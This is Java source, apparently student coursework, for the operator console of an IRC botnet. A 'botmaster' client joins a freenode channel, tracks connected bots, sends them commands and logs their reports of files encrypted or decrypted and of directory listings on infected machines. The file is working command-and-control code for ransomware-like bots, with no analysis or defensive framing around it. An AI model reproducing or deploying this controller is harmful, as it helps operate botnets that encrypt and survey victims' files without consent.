package botadmin;

import java.util.*;
import java.text.*;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.ArrayList;
import javax.swing.*;
import java.awt.event.*;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.PrintWriter;
public class IRC {
    static ArrayList<String> botlist;
    //LL para el reporte
    static ArrayList<String> log;
    String server = "irc.freenode.net";
    String nick = "simple_pru1a";
    String login = "simple_pru1a";
    String channel = "#pruebastareac2016";
    int port;
    //Cadena para guardar el nombre del log.
    static String logname=null;
    Socket socket = null;
    BufferedWriter writer = null;
    BufferedReader reader = null;
    DateFormat dateFormat;
    //BotAdmin GUI
    BotAdmin botadm;

    public IRC(String server, String nick, String channel, int port) 
                            throws IOException, InterruptedException {
        this.server = server;
        this.nick = nick;
        this.channel = channel;
        this.port = port;
        this.login = nick;
        this.socket = null;
        this.writer = null;
        this.reader = null;
        dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        botlist = new ArrayList<String>();
        botlist.add("All Bots");
        log=new ArrayList();
        init();
        this.botadm = new BotAdmin(this.writer,this.nick,this.channel,this.server);
        //mejorar
        Thread.sleep(1000);
        write(this.writer,"/names",this.channel);
    }

    public IRC() {
        this.server = "";
        this.nick = "";
        this.channel = "";
        this.port = -1;
        this.login = "";
        this.socket = null;
        this.writer = null;
        this.reader = null;
    }

    void init() throws IOException {
        socket = new Socket(server, 6667);
        writer = new BufferedWriter(
                    new OutputStreamWriter(socket.getOutputStream()));
        reader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
    }

    //termino la aplicacion, el servidor botara al bot||botAdmin en (+ -) 252 sec 
    String quitIRC() throws IOException {
        writer.write("PRIVMSG " + channel + " : /quit\r\n");
        writer.write("/quit");
        writer.flush();
        System.exit(0);
        return "quit";
    }

    //Actualiza la lista de bots en la GUI
    public static DefaultListModel changeList(){
      DefaultListModel model=new DefaultListModel();
      for(int i=0;i<botlist.size();i++){
         model.addElement(botlist.get(i));
      }
      return model;
   }
    
   void connect() throws IOException {
        writer.write("NICK " + nick + "\r\n");
        writer.write("USER " + login + " 8 * : Java IRC B0t\r\n");
        writer.flush();
        String line = null;
        while ((line = reader.readLine()) != null) {
            if (line.indexOf("004") >= 0) {
                this.botadm.jtxtstatus.setText("UP");
                this.botadm.jtxtstatus.setEditable(false);
                break;
            } else if (line.indexOf("433") >= 0) {
                System.out.println("Nickname is already in use.");
                return;
            }
        }
    }

    void joinChannel() throws IOException {
        writer.write("JOIN " + channel + "\r\n");
        writer.flush();
    }

    
    static void write(BufferedWriter writer,String line,String channel){
        try{
            writer.write("PRIVMSG " + channel + " :"+line+"\r\n");
            writer.flush();
        }catch(Exception e){
            System.out.println("Error @IRC.write "+e.getMessage());
        }
    }
    
    /*
        Metodo para ir leyendo las lineas y realizando acciones de acuerdo a 
        estas.
    */
    void readLines() throws IOException {
        String line = null;
        try {
            while ((line = reader.readLine()) != null) {
                //Un bot respondio al ping, revisamos si ya lo tenemos en la lista
                //de bots, de no ser asi lo agregamos
                if(line.toLowerCase().contains("pinged")) {
                    String usr = getUser(line);
                    if(!added(usr))
                        addUser(usr);
                }
                //Respondemos a los pings hechos a BotAdmin
                else if(line.toLowerCase().contains("ping")) {
                    writer.write("PONG " + line.substring(5) + "\r\n");
                    writer.write("PRIVMSG " + channel + " :I got pinged!\r\n");
                    writer.flush();
                }
                //Un bot entro al canal,
                else if(line.contains("JOIN")){
                    String usr=getUser(line);
                    if(!added(usr))
                        addUser(usr);
                }
                //Un bot sale del canal.
                else if(line.contains("QUIT :")||line.contains("PART #")){
                    String usr=getUser(line);
                    removeUser(usr);
                }
                else if(line.contains("names")){
                    System.out.println("NAMES:\n"+line);
                }
                //Con esto podemos ir guardando que archivos se cifraron o descifraron.
                else if(line.contains("cifrado")){
                    String s=dateFormat.format(new Date()).toString();
                    log.add(s+"\n"+line);
                    this.botadm.jtxtarealogs.setText(this.botadm.jtxtarealogs.getText() + "\n\n" + line);
                }
                //Un bot regreso la lista de archivos en alguna direccion 
                else if(line.contains("Files @")){
                    String s=dateFormat.format(new Date()).toString();
                    log.add(s+"\n"+line);
                    this.botadm.jtxtarealogs.setText(this.botadm.jtxtarealogs.getText() + "\n\n" + line);
                }
                else {
                    this.botadm.jtxtarealogs.setText(this.botadm.jtxtarealogs.getText() + "\n\n" + line);
                }
            }
        } catch (Exception e) {
            System.out.println("Error @IRC.readLines"
                    + e.getMessage());
        } finally {
            writer.write("/quit");
            writer.flush();
        }
    }

    //Metodo para escribir en un archivo la lista ligada con el reporte de actividad.
    static void writeLog(){
        try{
            SimpleDateFormat dateF = new SimpleDateFormat("yyyy/MM/dd");
            String s=dateF.format(new Date()).toString().replace("/","-");
            String filename="log-"+s+".txt";
            logname=filename;
            PrintWriter pwriter = new PrintWriter(filename, "UTF-8");
            for(int i=0;i<log.size();i++){
                pwriter.println("\n"+log.get(i));
            }
            pwriter.close();
        }catch(Exception e){
            System.out.println("Something went wrong "+e.getMessage());
        }
    }
    
    static String readLog() throws FileNotFoundException, IOException{
        //escribimos en el archivo para mantener coherencia
        writeLog();
        String content="";
        if(logname!=null){
            FileReader fr=new FileReader(logname);
            BufferedReader br=new BufferedReader(fr);
            String strline;
            while((strline=br.readLine())!=null){
             content+="\n"+parse(strline);
            }
            return content;
        }else{
            return "No activity yet!";
        }
    }
    
    /*
        Metodo que toma una linea del reporte de actividad y la regresa
        con un formato mas legible
    */
    static String parse(String line){
      if(line.contains("<")){
         int idx=line.indexOf("<");
         line=line.substring(idx);
      }
      if(line.contains("Files @"))
         line=line.replace(": ","\n").replace("[","").replace("]","").replace(",","\n");
      return line;
   }
    
    void start() throws IOException {
        connect();
        joinChannel();
        readLines();
    }

    static String getUser(String line) {
        int idx1 = line.indexOf(":");
        int idx2 = line.indexOf("!");
        return line.substring(++idx1, idx2);
    }

   /*
    Regresa si el nombre del bot ya ha sido agregado a la lista de bots
   */
   public static boolean added(String user){
      return botlist.contains(user);
   }
   
   /*
    Agrega el nombre del bot a la lista de bots
   */
   public static void addUser(String usr){
      if(!added(usr))
         botlist.add(usr);
   }
   
   /*
    Elimina al bot de la lista de bots
   */
   public static void removeUser(String usr){
       if(added(usr))
           botlist.remove(usr);
   }
   
    public static void main(String[] args) throws Exception {
        String nick = "botmaster" + ((int) (Math.random() * 1000)) % 512;
        String server = "irc.freenode.net";
        String channel = "#pruebastareac2016";
        int port = 6667;
        if (args.length == 4) {
            nick = args[0];
            server = args[1];
            channel ="#"+args[2];
            port = Integer.parseInt(args[3]);
        }
        System.out.println("INICIANDO IRC");
        System.out.println("El nick es " + nick);
        System.out.println("El server es " + server);
        System.out.println("El puerto es " + port);
        IRC nuevo = new IRC(server, nick, channel, port);
        nuevo.start();
    }
}
